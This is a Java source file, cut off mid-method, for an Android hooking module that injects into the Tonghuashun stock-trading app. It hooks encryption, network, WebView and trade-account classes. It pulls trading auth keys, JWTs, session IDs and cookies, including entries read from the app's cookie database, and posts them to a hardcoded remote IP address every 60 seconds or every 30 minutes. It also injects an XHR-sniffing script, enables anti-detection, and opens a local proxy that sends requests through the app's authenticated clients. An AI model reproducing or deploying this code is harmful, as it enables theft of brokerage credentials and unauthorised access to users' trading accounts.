package com.yuyang.thshook;

import android.app.Application;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import top.canyie.pine.Pine;
import top.canyie.pine.PineConfig;
import top.canyie.pine.callback.MethodHook;

public class MainHook {

    private static final String TAG = "THSHook";
    private static volatile boolean hooksInstalled = false;
    private static volatile ClassLoader appClassLoader = null;
    private static volatile Application appInstance = null;
    private static volatile boolean webViewBridgeResolverHooked = false;
    private static volatile boolean webViewBridgePluginCacheHooked = false;
    private static final AtomicBoolean realTimeDataCoreHooked = new AtomicBoolean(false);
    private static final AtomicBoolean marketProtocolBoundaryHooked = new AtomicBoolean(false);
    private static final AtomicBoolean marketSocketIoHooked = new AtomicBoolean(false);
    private static final AtomicBoolean stuffTableReadHooked = new AtomicBoolean(false);
    private static final AtomicBoolean indicatorQueryManagerHooked = new AtomicBoolean(false);
    private static final AtomicBoolean communicationKeepAliveHooked = new AtomicBoolean(false);
    private static final Object realTimeDataRequestLock = new Object();
    private static final Object unifiedRequestLock = new Object();
    private static final Object marketWireFileLock = new Object();
    private static final AtomicInteger marketWireCaptureActive = new AtomicInteger(0);
    private static volatile String marketWireCaptureId = null;
    private static final ConcurrentHashMap<String, Boolean> hookedBridgeMethods = new ConcurrentHashMap<>();
    private static final AtomicBoolean tradeAccountRegistryHooked = new AtomicBoolean(false);
    private static final AtomicBoolean tradingSdkBridgeHooked = new AtomicBoolean(false);
    private static final AtomicInteger bridgeRetryAttempts = new AtomicInteger(0);
    private static final AtomicBoolean speculativeTradeClassesHooked = new AtomicBoolean(false);
    private static final ConcurrentHashMap<String, Boolean> hookedTradeAccountMethods =
            new ConcurrentHashMap<>();
    private static volatile Object tradeAccountManagerInstance = null;
    private static volatile Class<?> tradeAccountManagerClass = null;
    private static volatile List<Class<?>> tradeAccountClassChain = new ArrayList<>();
    // 解壳 ClassLoader 与各交易查询协议最近一次的 (pageId,params)，供进程内
    // 只读调用器重放。params 只在内存暂存，绝不写日志。key = protocolId。
    private static volatile ClassLoader thsAppClassLoader = null;
    private static final ConcurrentHashMap<Integer, int[]> capturedQueryPageIds =
            new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<Integer, String> capturedQueryParams =
            new ConcurrentHashMap<>();
    private static final AtomicBoolean proxyServerStarted = new AtomicBoolean(false);
    private static final AtomicInteger realtimeStreamSessions = new AtomicInteger(0);
    private static final AtomicInteger directMarketInstanceId = new AtomicInteger(10000);
    private static final ConcurrentHashMap<Integer, CountDownLatch> directProtocolLatches =
            new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<Integer, Object> directProtocolResponses =
            new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<Integer, Integer> stuffTableCaptureSignatures =
            new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<String, Boolean> hookedIndicatorClientMethods =
            new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<String, Boolean> hookedIndicatorCallbackMethods =
            new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<String, Boolean> hookedIndicatorModelConstructors =
            new ConcurrentHashMap<>();
    private static final List<String> indicatorQueryCapture =
            java.util.Collections.synchronizedList(new ArrayList<>());
    private static volatile long indicatorModelCaptureUntilMs = 0L;
    private static final AtomicInteger indicatorQuerySequence = new AtomicInteger(0);
    private static final AtomicBoolean indicatorResultShapeLogged = new AtomicBoolean(false);
    private static final ConcurrentHashMap<Integer, String> indicatorCallbackQueryIds =
            new ConcurrentHashMap<>();
    // OkHttpClient 捕获
    // 所有已创建的 OkHttpClient 实例
    private static final List<Object> allClients = java.util.Collections.synchronizedList(new ArrayList<>());
    // interceptor identity hash → OkHttpClient 映射
    private static final ConcurrentHashMap<Integer, Object> interceptorClientMap = new ConcurrentHashMap<>();
    // 域名 → OkHttpClient 映射（从实际请求中学习）
    private static final ConcurrentHashMap<String, Object> domainClients = new ConcurrentHashMap<>();
    // ThreadLocal 在 build() 的 beforeCall/afterCall 之间传递 interceptor ID
    private static final ThreadLocal<Integer> pendingInterceptorId = new ThreadLocal<>();

    // 最新捕获的交易认证参数（从 trade.5ifund.com 请求中提取）
    private static volatile String latestKey1 = null;
    private static volatile String latestKey2 = null;
    private static volatile String latestKey3 = null;
    private static volatile String latestKey4 = null;
    private static volatile String latestKey5 = null;
    private static volatile String latestUserId = null;
    private static volatile String latestSessionId = null;
    private static volatile String latestCookie = null;
    private static volatile long authCaptureTime = 0;

    // 问财 hexin-v token（从 Cookie 中的 v= 字段提取）
    private static volatile String latestHexinV = null;
    private static volatile long lastHexinVReportTime = 0;

    // Token 上报到远程服务器
    private static final String AUTH_REPORT_URL = "http://119.23.227.187:8900/api/auth/refresh";
    private static final String HEXINV_REPORT_URL = "http://119.23.227.187:8900/api/auth/hexin-v";
    private static volatile long lastAuthReportTime = 0;
    private static final long AUTH_REPORT_INTERVAL = 60_000; // 最少间隔 60 秒
    private static final boolean SENSITIVE_PAYLOAD_LOGGING = false;

    /**
     * 从 JWT token (key5) 中解码 exp 过期时间（秒级时间戳）
     * 同花顺 JWT 格式: header.signature，exp 可能在 part[0] 或 part[1]
     */
    private static long decodeJwtExp(String jwt) {
        if (jwt == null || jwt.isEmpty()) return 0;
        String[] parts = jwt.split("\\.");
        // 优先尝试 payload (part[1])，再尝试 header (part[0])
        int[] indices = parts.length > 1 ? new int[]{1, 0} : new int[]{0};
        for (int idx : indices) {
            try {
                String segment = parts[idx];
                // base64url 补齐 padding
                int pad = 4 - segment.length() % 4;
                if (pad != 4) {
                    StringBuilder sb = new StringBuilder(segment);
                    for (int i = 0; i < pad; i++) sb.append('=');
                    segment = sb.toString();
                }
                // base64url -> base64
                segment = segment.replace('-', '+').replace('_', '/');
                byte[] decoded = android.util.Base64.decode(segment, android.util.Base64.DEFAULT);
                String jsonStr = new String(decoded, "UTF-8");
                // 简单解析 "exp": 数字
                int expIdx = jsonStr.indexOf("\"exp\"");
                if (expIdx == -1) continue;
                int colonIdx = jsonStr.indexOf(':', expIdx);
                if (colonIdx == -1) continue;
                // 跳过冒号后的空白
                int numStart = colonIdx + 1;
                while (numStart < jsonStr.length() && !Character.isDigit(jsonStr.charAt(numStart))) numStart++;
                int numEnd = numStart;
                while (numEnd < jsonStr.length() && Character.isDigit(jsonStr.charAt(numEnd))) numEnd++;
                if (numStart >= numEnd) continue;
                long exp = Long.parseLong(jsonStr.substring(numStart, numEnd));
                // 毫秒时间戳转秒
                if (exp > 10000000000L) exp = exp / 1000;
                return exp;
            } catch (Throwable ignored) {}
        }
        return 0;
    }

    /**
     * 将捕获的 auth token 上报到远程服务器
     * 在后台线程执行，有频率限制
     */
    private static void reportAuthToServer() {
        long now = System.currentTimeMillis();
        if (now - lastAuthReportTime < AUTH_REPORT_INTERVAL) return;
        if (latestKey5 == null || latestKey5.isEmpty()) return;
        lastAuthReportTime = now;

        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                // 解码 JWT 获取过期时间
                long expiresAt = decodeJwtExp(latestKey5);

                // 构建 JSON body
                StringBuilder json = new StringBuilder();
                json.append("{\"auth\":{");
                json.append("\"key1\":\"").append(esc(latestKey1)).append("\"");
                json.append(",\"key2\":\"").append(esc(latestKey2)).append("\"");
                json.append(",\"key3\":\"").append(esc(latestKey3)).append("\"");
                json.append(",\"key4\":\"").append(esc(latestKey4)).append("\"");
                json.append(",\"key5\":\"").append(esc(latestKey5)).append("\"");
                json.append(",\"userId\":\"").append(esc(latestUserId)).append("\"");
                json.append(",\"sessionId\":\"").append(esc(latestSessionId)).append("\"");
                json.append(",\"cookie\":\"").append(esc(latestCookie)).append("\"");
                json.append(",\"account\":\"").append(esc(latestKey3)).append("\"");
                json.append("}");
                if (expiresAt > 0) {
                    json.append(",\"expires_at\":").append(expiresAt);
                }
                json.append(",\"sync_source\":\"zygisk_auto\"}");

                conn = (HttpURLConnection) new URL(AUTH_REPORT_URL).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setDoOutput(true);

                byte[] data = json.toString().getBytes("UTF-8");
                conn.getOutputStream().write(data);
                conn.getOutputStream().flush();

                int code = conn.getResponseCode();
                if (code == 200) {
                    Log.i(TAG, "Auth reported to server successfully, key3=" + latestKey3
                            + ", expires_at=" + expiresAt);
                } else {
                    Log.w(TAG, "Auth report failed, HTTP " + code);
                }
            } catch (Throwable e) {
                Log.w(TAG, "Auth report error: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }, "THSHook-AuthReport").start();
    }

    /**
     * 上报问财 hexin-v token 到服务端
     */
    private static void reportHexinVToServer() {
        long now = System.currentTimeMillis();
        if (now - lastHexinVReportTime < AUTH_REPORT_INTERVAL) return;
        if (latestHexinV == null || latestHexinV.isEmpty()) return;
        lastHexinVReportTime = now;

        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String json = "{\"hexin_v\":\"" + esc(latestHexinV) + "\",\"sync_source\":\"zygisk_auto\"}";

                conn = (HttpURLConnection) new URL(HEXINV_REPORT_URL).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setDoOutput(true);

                byte[] data = json.getBytes("UTF-8");
                conn.getOutputStream().write(data);
                conn.getOutputStream().flush();

                int code = conn.getResponseCode();
                if (code == 200) {
                    Log.i(TAG, "hexin-v reported to server, len=" + latestHexinV.length());
                } else {
                    Log.w(TAG, "hexin-v report failed, HTTP " + code);
                }
            } catch (Throwable e) {
                Log.w(TAG, "hexin-v report error: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }, "THSHook-HexinVReport").start();
    }

    private static String esc(String s) {
        if (s == null) return "";
        StringBuilder escaped = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char value = s.charAt(i);
            switch (value) {
                case '\\': escaped.append("\\\\"); break;
                case '"': escaped.append("\\\""); break;
                case '\b': escaped.append("\\b"); break;
                case '\f': escaped.append("\\f"); break;
                case '\n': escaped.append("\\n"); break;
                case '\r': escaped.append("\\r"); break;
                case '\t': escaped.append("\\t"); break;
                default:
                    if (value < 0x20) {
                        escaped.append(String.format("\\u%04x", (int) value));
                    } else {
                        escaped.append(value);
                    }
            }
        }
        return escaped.toString();
    }

    /**
     * 从 Cipher 加密的明文 JSON 中提取所有认证参数（key3/key4/key5/custId 等）
     */
    private static void extractAuthFromCipherPlaintext(String text) {
        // 提取各字段的通用方法
        String[] keys = {"key3", "key4", "key5", "custId"};
        for (String key : keys) {
            String pattern = "\"" + key + "\":\"";
            int start = text.indexOf(pattern);
            if (start == -1) continue;
            start += pattern.length();
            int end = text.indexOf("\"", start);
            if (end <= start) continue;
            String value = text.substring(start, end);
            value = value.replace("\\u003d", "=");
            if (value.isEmpty()) continue;

            switch (key) {
                case "key3":
                    latestKey3 = value;
                    if (latestUserId == null || latestUserId.isEmpty()) latestUserId = value;
                    break;
                case "key4":
                    latestKey4 = value;
                    break;
                case "key5":
                    if (value.length() > 50) {
                        latestKey5 = value;
                        authCaptureTime = System.currentTimeMillis();
                        Log.i(TAG, "Auth captured from cipher: key5 len=" + value.length()
                                + ", key3=" + latestKey3);
                    }
                    break;
                case "custId":
                    if (latestKey3 == null || latestKey3.isEmpty()) latestKey3 = value;
                    if (latestUserId == null || latestUserId.isEmpty()) latestUserId = value;
                    break;
            }
        }
        // key1 使用默认值（设备ID，Cipher明文中通常没有）
        if (latestKey1 == null || latestKey1.isEmpty()) {
            latestKey1 = "7246091a5f126b63";
        }
        if (latestKey2 == null || latestKey2.isEmpty()) {
            latestKey2 = "2293a78f6581c12bbb334759458d4de3";
        }
        if (latestKey5 != null && latestKey5.length() > 50) {
            reportAuthToServer();
        }
    }

    // 保存最近的 WebView 引用（用于注入 JavaScript）
    private static volatile Object latestWebView = null;

    // 保存购买相关的方法引用和上下文（用于直接调用app的购买方法）
    private static volatile Object buyServiceInstance = null;
    private static volatile Method buyServiceMethod = null;
    private static volatile Object jsBridgeHandler = null;

    // 日志限流
    private static final AtomicInteger httpLogCount = new AtomicInteger(0);
    private static volatile long httpLogWindowStart = 0;
    private static final int HTTP_LOG_LIMIT = 100;

    // 股票数据：旧版本曾从本地 SQLite 读取交易数据。11.58.03 已不再使用该路径，
    // 这里只保留引用以协助确认版本迁移，禁止在代码中保存账户密钥。
    private static volatile Object stockDatabase = null;

    // XHR Hook JavaScript - 注入到 WebView 捕获所有 AJAX 请求
    private static final String XHR_HOOK_SCRIPT =
        "(function() {" +
        "    if (window.__XHR_HOOKED__) return;" +
        "    window.__XHR_HOOKED__ = true;" +
        "    " +
        "    var originalOpen = XMLHttpRequest.prototype.open;" +
        "    var originalSend = XMLHttpRequest.prototype.send;" +
        "    var originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;" +
        "    " +
        "    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {" +
        "        this._method = method;" +
        "        this._url = url;" +
        "        this._requestHeaders = {};" +
        "        this._startTime = Date.now();" +
        "        return originalOpen.apply(this, arguments);" +
        "    };" +
        "    " +
        "    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {" +
        "        this._requestHeaders[header] = value;" +
        "        return originalSetRequestHeader.apply(this, arguments);" +
        "    };" +
        "    " +
        "    XMLHttpRequest.prototype.send = function(body) {" +
        "        var xhr = this;" +
        "        " +
        "        var requestInfo = {" +
        "            method: xhr._method," +
        "            url: xhr._url," +
        "            headers: xhr._requestHeaders," +
        "            body: body || null," +
        "            timestamp: xhr._startTime" +
        "        };" +
        "        " +
        "        if (xhr._url && (xhr._url.indexOf('trade.5ifund.com') > -1 || xhr._url.indexOf('/fund/') > -1)) {" +
        "            console.log('[XHR_HOOK_REQUEST] ' + JSON.stringify(requestInfo));" +
        "        }" +
        "        " +
        "        xhr.addEventListener('load', function() {" +
        "            if (xhr._url && (xhr._url.indexOf('trade.5ifund.com') > -1 || xhr._url.indexOf('/fund/') > -1)) {" +
        "                var responseInfo = {" +
        "                    url: xhr._url," +
        "                    status: xhr.status," +
        "                    statusText: xhr.statusText," +
        "                    responseText: xhr.responseText.substring(0, 10000)," +
        "                    responseHeaders: xhr.getAllResponseHeaders()," +
        "                    duration: Date.now() - xhr._startTime" +
        "                };" +
        "                console.log('[XHR_HOOK_RESPONSE] ' + JSON.stringify(responseInfo));" +
        "            }" +
        "        });" +
        "        " +
        "        xhr.addEventListener('error', function() {" +
        "            console.log('[XHR_HOOK_ERROR] ' + xhr._url);" +
        "        });" +
        "        " +
        "        return originalSend.apply(this, arguments);" +
        "    };" +
        "    " +
        "    console.log('[XHR_HOOK] Initialized');" +
        "})();";

    public static void entry(ClassLoader classLoader, String pineSoPath) {
        Log.i(TAG, "MainHook.entry() called");

        try {
            String architecture = System.getProperty("os.arch", "");
            String normalizedArchitecture = architecture.toLowerCase(Locale.ROOT);
            Log.i(TAG, "Runtime architecture: " + architecture);
            if (pineSoPath == null
                    || normalizedArchitecture.contains("x86")
                    || normalizedArchitecture.contains("amd64")
                    || normalizedArchitecture.contains("i386")
                    || normalizedArchitecture.contains("i686")) {
                Log.i(TAG, "Using LSPosed hook bridge on " + architecture);
            } else {
                System.load(pineSoPath);
                Log.i(TAG, "libpine.so loaded on " + architecture);
            }

            PineConfig.libLoader = new Pine.LibLoader() {
                @Override public void loadLib() { }
            };
            PineConfig.debug = false;
            PineConfig.debuggable = false;
            PineConfig.antiChecks = true;
            PineConfig.disableHiddenApiPolicy = false;
            PineConfig.disableHiddenApiPolicyForPlatformDomain = false;

            Pine.ensureInitialized();
            Log.i(TAG, "Pine initialized");

            // 直接使用传入的classLoader安装hooks（不等待Application.onCreate）
            installAllHooks(classLoader);

            // Hook Application.onCreate
            Method onCreate = Application.class.getDeclaredMethod("onCreate");
            Pine.hook(onCreate, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    Application app = (Application) callFrame.thisObject;
                    appInstance = app;
                    Log.i(TAG, "Application.onCreate: " + app.getClass().getName());
                    hookCommunicationServiceKeepAlive(app.getClassLoader());
                    hookRealTimeDataCore(app.getClassLoader());
                    hookMarketProtocolBoundary(app.getClassLoader());
                    hookMarketSocketIo();
                    hookStuffTableReads(app.getClassLoader());
                    hookIndicatorQueries(app.getClassLoader());
                    installAllHooks(app.getClassLoader());
                }
            });
            Log.i(TAG, "Hook installed on Application.onCreate");

            // 延迟线程直接安装（绕过 360 加固）
            new Thread(() -> {
                try {
                    for (int i = 0; i < 30; i++) {
                        Thread.sleep(500);
                        try {
                            Class<?> atClass = Class.forName("android.app.ActivityThread");
                            Method currentApp = atClass.getDeclaredMethod("currentApplication");
                            Application app = (Application) currentApp.invoke(null);
                            if (app != null) {
                                ClassLoader cl = app.getClassLoader();
                                if (cl != null) {
                                    // 等待 THS 的实际 Application 类或 OkHttp 加载
                                    try {
                                        cl.loadClass("com.hexin.plat.android.App");
                                        Log.i(TAG, "App ready (App class) via ActivityThread after " + (i * 500) + "ms");
                                    } catch (ClassNotFoundException e1) {
                                        // 备选：等待 OkHttp 类加载（因为我们实际需要的是 OkHttp）
                                        cl.loadClass("okhttp3.OkHttpClient");
                                        Log.i(TAG, "App ready (OkHttp class) via ActivityThread after " + (i * 500) + "ms");
                                    }
                                    installAllHooks(cl);
                                    return;
                                }
                            }
                        } catch (ClassNotFoundException e) {
                            // App 类还没加载，继续等
                        } catch (Throwable e) {
                            Log.w(TAG, "Waiting... (" + e.getClass().getSimpleName() + ": " + e.getMessage() + ")");
                        }
                    }
                    Log.e(TAG, "Timeout waiting for App ClassLoader (15s)");
                } catch (Throwable e) {
                    Log.e(TAG, "Delayed hook install failed", e);
                }
            }, "THSHook-Delay").start();

        } catch (Throwable e) {
            Log.e(TAG, "Hook failed", e);
        }
    }

    private static volatile boolean okHttpHooked = false;
    private static volatile boolean unifiedRequestModelHooked = false;

    private static synchronized void installAllHooks(ClassLoader cl) {
        // 允许重入：如果 OkHttp 还没 hook 成功，用新的 classLoader 重试
        if (hooksInstalled && okHttpHooked) return;

        boolean firstRun = !hooksInstalled;
        hooksInstalled = true;
        appClassLoader = cl;

        Log.i(TAG, "=== installAllHooks start === firstRun=" + firstRun + " okHttpHooked=" + okHttpHooked + " cl=" + cl);

        // 启用 WebView 调试
        try {
            Class<?> webViewClass = Class.forName("android.webkit.WebView");
            Method setDebug = webViewClass.getDeclaredMethod("setWebContentsDebuggingEnabled", boolean.class);
            setDebug.invoke(null, true);
            Log.i(TAG, "WebView debugging enabled");
        } catch (Throwable e) {
            Log.w(TAG, "WebView debug enable failed: " + e.getMessage());
        }

        // OkHttp interceptor — 最关键，允许重试
        if (!okHttpHooked) {
            try {
                injectInterceptor(cl);
                okHttpHooked = true;
                Log.i(TAG, "injectInterceptor done ✅");
            } catch (Throwable e) {
                Log.e(TAG, "injectInterceptor failed (will retry with next classLoader)", e);
            }
        }

        if (!unifiedRequestModelHooked) {
            try {
                hookUnifiedRequestModels(cl);
                unifiedRequestModelHooked = true;
                Log.i(TAG, "Unified request model hook installed");
            } catch (Throwable e) {
                Log.w(TAG, "Unified request model hook unavailable: " + e.getMessage());
            }
        }

        if (!indicatorQueryManagerHooked.get()) {
            try {
                hookIndicatorQueries(cl);
                Log.i(TAG, "Indicator QueryClient hook installed");
            } catch (Throwable e) {
                Log.w(TAG, "Indicator QueryClient hook unavailable: " + e.getMessage());
            }
        }

        // 交易账户探针 — 允许重试：360 加固下首次 ClassLoader 缺少 p0s，
        // 必须等解壳后的 App ClassLoader 到达再安装
        if (!tradeAccountRegistryHooked.get()) {
            try {
                hookTradeAccountRegistry(cl);
                Log.i(TAG, "hookTradeAccountRegistry done");
            } catch (Throwable e) {
                Log.e(TAG, "hookTradeAccountRegistry failed (will retry with next classLoader)", e);
            }
        }

        // MasterModuleBridge（libweituo.so 唯一 Java 入口）：其 <clinit> 需要 App 上下文，
        // 启动期直接挂钩会把类标记为 erroneous 导致 App 崩溃（已实测）。
        // 只通过延迟重试 + F(119) 交易事件触发。
        try {
            scheduleTradingSdkBridgeRetry(cl);
        } catch (Throwable e) {
            Log.e(TAG, "scheduleTradingSdkBridgeRetry failed", e);
        }

        // 以下 hooks 只在首次运行时安装
        if (firstRun) {
            try { hookHttpURLConnection(); Log.i(TAG, "hookHttpURLConnection done"); }
            catch (Throwable e) { Log.e(TAG, "hookHttpURLConnection failed", e); }

            try { hookWebViewRequests(); Log.i(TAG, "hookWebViewRequests done"); }
            catch (Throwable e) { Log.e(TAG, "hookWebViewRequests failed", e); }

            try { hookJSBridgeNative(); Log.i(TAG, "hookJSBridgeNative done"); }
            catch (Throwable e) { Log.e(TAG, "hookJSBridgeNative failed", e); }

            try { hookSQLiteDatabase(); Log.i(TAG, "hookSQLiteDatabase done"); }
            catch (Throwable e) { Log.e(TAG, "hookSQLiteDatabase failed", e); }

            try { hookTradeUIMessages(); Log.i(TAG, "hookTradeUIMessages done"); }
            catch (Throwable e) { Log.e(TAG, "hookTradeUIMessages failed", e); }

            try { hookCipher(); Log.i(TAG, "hookCipher done"); }
            catch (Throwable e) { Log.e(TAG, "hookCipher failed", e); }

            try { hookWTBuyConfirmClient(cl); Log.i(TAG, "hookWTBuyConfirmClient done"); }
            catch (Throwable e) { Log.e(TAG, "hookWTBuyConfirmClient failed", e); }

            try { hookClientRequestHX(cl); Log.i(TAG, "hookClientRequestHX done"); }
            catch (Throwable e) { Log.e(TAG, "hookClientRequestHX failed", e); }

            try { hookActivityAndClicks(); Log.i(TAG, "hookActivityAndClicks done"); }
            catch (Throwable e) { Log.e(TAG, "hookActivityAndClicks failed", e); }
        }

        // 启动代理服务器
        startProxyServer(cl);

        // 延迟读取 WebView Cookie DB 并上报 hexin-v
        if (firstRun) {
            startCookieDbWatcher();
        }

        Log.i(TAG, "=== installAllHooks complete ===");
    }

    private static void hookUnifiedRequestModels(ClassLoader cl) throws Exception {
        Class<?> bridgeClass = cl.loadClass(
                "com.hexin.android.base_hummer.export.component.business."
                        + "HummerUnifiedRequestBridge");
        Class<?> modelClass = cl.loadClass(
                "com.hexin.android.base_hummer.export.component.business."
                        + "HummerUnifiedRequestBridge$RequestModel");
        Class<?> callbackClass = cl.loadClass("ld0");
        Method init = bridgeClass.getMethod("init", modelClass, callbackClass);
        Pine.hook(init, new MethodHook() {
            @Override
            public void beforeCall(Pine.CallFrame frame) {
                Object model = frame.args != null && frame.args.length > 0
                        ? frame.args[0]
                        : null;
                Log.i(TAG, "UnifiedRequest.model " + describeObjectFields(model, 12000));
            }
        });
    }

    private static String describeObjectFields(Object target, int maxLength) {
        if (target == null) return "null";
        StringBuilder result = new StringBuilder(target.getClass().getName()).append('{');
        boolean first = true;
        for (Class<?> type = target.getClass();
             type != null && type != Object.class;
             type = type.getSuperclass()) {
            for (Field field : type.getDeclaredFields()) {
                try {
                    field.setAccessible(true);
                    if (!first) result.append(", ");
                    first = false;
                    result.append(field.getName()).append('=').append(field.get(target));
                    if (result.length() >= maxLength) {
                        result.setLength(maxLength);
                        return result.append("...[truncated]}").toString();
                    }
                } catch (Throwable ignored) {
                    // A missing optional field must not break request observation.
                }
            }
        }
        return result.append('}').toString();
    }

    /**
     * 定期从 WebView Cookie 数据库读取 iwencai 的 v token 并上报
     * Cookie DB 路径: /data/data/com.hexin.plat.android/app_webview/Default/Cookies
     */
    private static void startCookieDbWatcher() {
        new Thread(() -> {
            // 等待 App 完全启动（WebView 初始化、登录完成）
            try { Thread.sleep(15000); } catch (InterruptedException e) { return; }

            // Cookie DB 可能在两个路径之一
            String[] dbPaths = {
                "/data/data/com.hexin.plat.android/app_webview/Default/Cookies",
                "/data/data/com.hexin.plat.android/app_webview_com.hexin.plat.android/Default/Cookies",
            };
            String dbPath = null;
            for (String p : dbPaths) {
                if (new java.io.File(p).exists()) { dbPath = p; break; }
            }
            if (dbPath == null) {
                Log.w(TAG, "CookieDbWatcher: no Cookie DB found, will retry");
                // 等更久再试（App 可能还没创建 WebView）
                try { Thread.sleep(30000); } catch (InterruptedException e) { return; }
                for (String p : dbPaths) {
                    if (new java.io.File(p).exists()) { dbPath = p; break; }
                }
            }
            if (dbPath == null) {
                Log.e(TAG, "CookieDbWatcher: Cookie DB not found after retry, aborting");
                return;
            }
            Log.i(TAG, "CookieDbWatcher started, db=" + dbPath);

            // 首次读取 + 之后每 30 分钟检查一次
            while (true) {
                try {
                    readAndReportCookies(dbPath);
                } catch (Throwable e) {
                    Log.w(TAG, "CookieDbWatcher error: " + e.getMessage());
                }
                try { Thread.sleep(30 * 60 * 1000); } catch (InterruptedException e) { return; }
            }
        }, "THSHook-CookieDbWatcher").start();
    }

    private static void readAndReportCookies(String dbPath) {
        java.io.File dbFile = new java.io.File(dbPath);
        if (!dbFile.exists()) {
            Log.w(TAG, "Cookie DB not found: " + dbPath);
            return;
        }

        android.database.sqlite.SQLiteDatabase db = null;
        try {
            db = android.database.sqlite.SQLiteDatabase.openDatabase(
                    dbPath, null, android.database.sqlite.SQLiteDatabase.OPEN_READONLY);

            // 读取 .10jqka.com.cn 域名下的所有关键 cookie
            String[] targetNames = {"v", "sess_tk", "ticket", "cuc", "userid", "u_name"};
            StringBuilder cookieJson = new StringBuilder("{");
            boolean first = true;

            for (String name : targetNames) {
                android.database.Cursor cursor = db.rawQuery(
                        "SELECT value FROM cookies WHERE host_key='.10jqka.com.cn' AND name=?",
                        new String[]{name});
                if (cursor != null && cursor.moveToFirst()) {
                    String value = cursor.getString(0);
                    if (value != null && !value.isEmpty()) {
                        if (!first) cookieJson.append(",");
                        cookieJson.append("\"").append(name).append("\":\"").append(esc(value)).append("\"");
                        first = false;

                        if ("v".equals(name)) {
                            latestHexinV = value;
                            Log.i(TAG, "hexin-v from CookieDB: len=" + value.length());
                        }
                    }
                }
                if (cursor != null) cursor.close();
            }
            cookieJson.append("}");

            if (latestHexinV != null && !latestHexinV.isEmpty()) {
                reportIwencaiCookies(cookieJson.toString());
            }
        } catch (Throwable e) {
            Log.e(TAG, "readAndReportCookies failed: " + e.getMessage());
        } finally {
            if (db != null) {
                try { db.close(); } catch (Throwable ignored) {}
            }
        }
    }

    /**
     * 上报完整的 iwencai cookie 集合到服务端
     */
    private static void reportIwencaiCookies(String cookiesJson) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String json = "{\"cookies\":" + cookiesJson + ",\"sync_source\":\"cookie_db\"}";

                conn = (HttpURLConnection) new URL(HEXINV_REPORT_URL).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setDoOutput(true);

                byte[] data = json.getBytes("UTF-8");
                conn.getOutputStream().write(data);
                conn.getOutputStream().flush();

                int code = conn.getResponseCode();
                if (code == 200) {
                    Log.i(TAG, "iwencai cookies reported to server");
                } else {
                    Log.w(TAG, "iwencai cookies report failed, HTTP " + code);
                }
            } catch (Throwable e) {
                Log.w(TAG, "iwencai cookies report error: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }, "THSHook-CookieReport").start();
    }

    /**
     * 本地 HTTP 代理服务器，通过 app 的 OkHttpClient 转发请求
     * 端口按 Android 用户隔离：Owner=18900、User 10=18910、User 11=18920。
     * POST /proxy  {"url":"...","method":"GET|POST","body":"...","content_type":"..."}
     * GET /domains  列出已捕获的 OkHttpClient 域名
     * GET /clients  列出所有已捕获的 OkHttpClient 数量
     */
    private static int androidUserId() {
        return android.os.Process.myUid() / 100000;
    }

    private static int proxyPortForCurrentUser() {
        int userId = androidUserId();
        if (userId <= 0) return 18900;
        if (userId >= 10) return 18910 + ((userId - 10) * 10);
        return 18900 + userId;
    }

    private static void startProxyServer(ClassLoader cl) {
        if (!proxyServerStarted.compareAndSet(false, true)) {
            return;
        }
        new Thread(() -> {
            try {
                int listenPort = proxyPortForCurrentUser();
                ServerSocket server = new ServerSocket(listenPort);
                Log.i(TAG, "Proxy server started on port " + listenPort
                        + " androidUser=" + androidUserId());

                while (true) {
                    try {
                        Socket client = server.accept();
                        new Thread(() -> handleProxyRequest(client, cl)).start();
                    } catch (Throwable e) {
                        Log.e(TAG, "Proxy accept error: " + e.getMessage());
                    }
                }
            } catch (Throwable e) {
                proxyServerStarted.set(false);
                Log.e(TAG, "Proxy server failed to start: " + e.getMessage());
            }
        }, "THSHook-Proxy").start();
    }

    private static void handleProxyRequest(Socket client, ClassLoader cl) {
        try {
            client.setSoTimeout(30000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
            OutputStream out = client.getOutputStream();

